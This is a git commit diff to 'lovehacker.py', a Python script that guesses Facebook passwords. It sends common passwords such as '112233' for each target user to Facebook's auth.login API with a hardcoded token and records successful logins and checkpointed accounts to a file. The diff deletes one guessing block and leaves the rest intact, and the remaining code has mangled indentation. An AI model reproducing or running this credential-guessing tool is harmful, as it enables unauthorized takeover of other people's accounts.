0efefbb2b2aca258e4524604f874838cf024fdef
adilffm <56082276+adilffm@users.noreply.github.com>
2020-05-04 17:37:38 +0500

    lovehacker.py

--- lovehacker.py
+++ lovehacker.py
@@ -496,20 +496,7 @@ def pilih_super():
 													cek.close()
 													cekpoint.append(user+pass5)
 												else:
-    								pass6 = 'khankhan'
-											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-											q = json.load(data)
-											if 'access_token' in q:
-												print '\x1b[1;92mHack 100%💉\x1b[1;97m-\x1b[1;93m▬\x1b[1;97m-' + user + '-\x1b[1;93m▬\x1b[1;97m-' + pass6
-												oks.append(user+pass6)
-											else:
-												if 'www.facebook.com' in q["error_msg"]:
-													print '\x1b[1;93mCheckpoint\x1b[1;97m-\x1b[1;93m▬\x1b[1;97m-' + user + '-\x1b[1;93m▬\x1b[1;97m-' + pass6
-													cek = open("out/checkpoint.txt", "a")
-													cek.write(user+"|"+pass6+"\n")
-													cek.close()
-													cekpoint.append(user+pass6)
-												else:
+    								
     								pass7 = '112233'
 											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 											q = json.load(data)
